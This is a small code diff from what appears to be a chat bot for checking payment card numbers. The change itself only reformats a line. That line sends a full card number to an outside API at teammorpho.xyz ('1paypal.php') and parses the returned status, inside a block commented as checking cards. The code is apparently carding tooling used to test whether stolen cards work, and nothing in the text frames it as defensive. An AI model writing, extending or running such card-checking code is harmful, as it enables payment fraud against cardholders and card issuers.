@@ -121,7 +121,9 @@ Retry After {after}s
                             firstchk = await message.reply_text(firstresp, message.id)
                             # STARTED CHECKING CC#
                             tic = time.perf_counter()
-                            authurl = f"http://teammorpho.xyz/api/1paypal.php?lista={fullcc}"
+                            authurl = (
+                                f"http://teammorpho.xyz/api/1paypal.php?lista={fullcc}"
+                            )
                             reqone = session.get(authurl)
                             data = reqone.json()
                             stat = data["stuts"]
